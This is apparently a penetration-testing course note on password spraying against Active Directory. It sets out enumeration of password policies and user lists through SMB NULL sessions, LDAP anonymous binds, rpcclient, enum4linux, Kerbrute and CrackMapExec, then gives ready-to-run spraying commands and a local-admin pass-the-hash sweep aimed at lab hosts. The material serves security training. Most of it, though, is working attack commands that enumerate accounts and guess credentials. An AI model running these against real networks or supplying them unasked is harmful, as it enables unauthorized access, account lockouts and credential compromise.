# Password Spraying
Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.


## Enumerating the Password Policy Linux
```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### SMB NULL Sessions
SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.


#### Using rpcclient
```
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
```

#### Using enum4linux
```
enum4linux -P 172.16.5.5
```

#### Using enum4linux-ng
```
enum4linux-ng -P 172.16.5.5 -oA ilfreight

cat ilfreight.json 
```

### LDAP Anonymous Bind
```
COR33@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Enumerating the Password Policy Windows
###  Enumerating Null Session.
```
net use \\DC01\ipc$ "" /u:""
```

### Using net.exe
```
net accounts
```

### Using PowerView
```
import-module .\PowerView.ps1
Get-DomainPolicy
```

#  Making a Target User List

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist

## SMB NULL Session to Pull User List
If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.

It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.

Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.

```
$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

## Using rpcclient
```
$ rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
```

## Using CrackMapExec
```
$ crackmapexec smb 172.16.5.5 --users
```

## Gathering Users with LDAP Anonymous
### Using ldapsearch
```
$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

### Using windapsearch
```
$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

## Enumerating Users with Kerbrute
```
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > kerb.txt

grep -o '[a-zA-Z0-9._%+-]\+@[a-zA-Z0-9.-]\+\.[a-zA-Z]\{2,6\}' kerb.txt
```

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company's LinkedIn page.

## Credentialed Enumeration to Build our User List
```
$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users > crack.txt

awk -F 'INLANEFREIGHT.LOCAL\\\\' '{print $2}' crack.txt | awk '{print $1}' > new_crack.txt
```

# Internal Password Spraying 
## Linux
### Internal Password Spraying from a Linux Host
#### Using a Bash one-liner for the Attack
```
$for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Using Kerbrute for the Attack
```
$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

#### Using CrackMapExec & Filtering Logon Failures
```
$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Validating the Credentials with CrackMapExec
```
$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local Administrator Password Reuse
```
$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Windows
### Using DomainPasswordSpray.ps1
```
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

